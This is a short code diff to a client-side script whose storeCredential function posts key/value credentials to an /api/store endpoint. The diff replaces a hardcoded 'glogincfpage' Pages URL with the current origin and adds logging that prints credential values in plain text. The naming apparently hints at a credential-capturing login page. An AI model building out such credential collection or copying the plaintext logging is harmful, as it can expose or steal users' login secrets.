@@ -1,9 +1,10 @@
-// script.js (Client-side Fetch)
+console.log('Script loaded');
 
-// Replace with your actual Pages URL
-const PAGES_URL = "https://glogincfpage.pages.dev";
+// Use the current URL instead of a hardcoded one
+const PAGES_URL = window.location.origin;
 
 async function storeCredential(key, value) {
+    console.log('storeCredential function called');
     try {
         console.log(`Sending request to store: key=${key}, value=${value}`);
         const response = await fetch(`${PAGES_URL}/api/store`, {
@@ -13,6 +14,8 @@ async function storeCredential(key, value) {
             },
             body: JSON.stringify({ key: key, value: value })
         });
+
+        console.log('Response received:', response.status);
 
         if (!response.ok) {
             const errorData = await response.json();
